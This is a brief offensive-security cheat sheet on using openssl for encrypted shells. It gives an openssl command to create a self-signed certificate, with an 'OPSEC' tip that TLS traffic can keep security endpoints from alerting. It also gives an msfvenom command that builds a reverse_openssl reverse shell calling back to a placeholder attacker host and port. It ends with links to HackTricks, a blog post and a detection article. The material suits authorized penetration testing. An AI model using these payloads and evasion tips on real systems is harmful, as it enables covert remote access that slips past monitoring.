# Manual

## 01 - Common Files

```
/usr/bin/openssl
```

## 02 - Generate TLS Certificate

^b06d28

> [!TIP] OPSEC Consideration
> Some security endpoints won't trigger an alert due to a secure communication. 
> > [!INFO] Bind Shell Payloads
> > This is only works for bind shells to make the shell handler secure.

```
$ openssl req -x509 -newkey rsa:4096 -days 365 -nodes -subj "/C=<country_code>/ST=<state>/L=<locality>/O=<organization_name>/OU=<organization_unit>/CN=<domain.com>/emailAddress=<email>" -keyout private.key -out certificate.crt
```

## 03 - Generate Payloads

### 3.1 - Reverse Shells

```
$ msfvenom -p cmd/unix/reverse_openssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

---
## References

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)

### Rio Asmara Suryadi

- [Rio Asmara Suryadi: OpenSSL for Reverse Shell](https://rioasmara.com/2020/06/22/openssl-for-reverse-shell/)

### Sandfly Security

- [Sandfly Security: Detecting and Investigating OpenSSL Backdoors on Linux](https://www.sandflysecurity.com/blog/detecting-and-investigating-openssl-backdoors-on-linux/)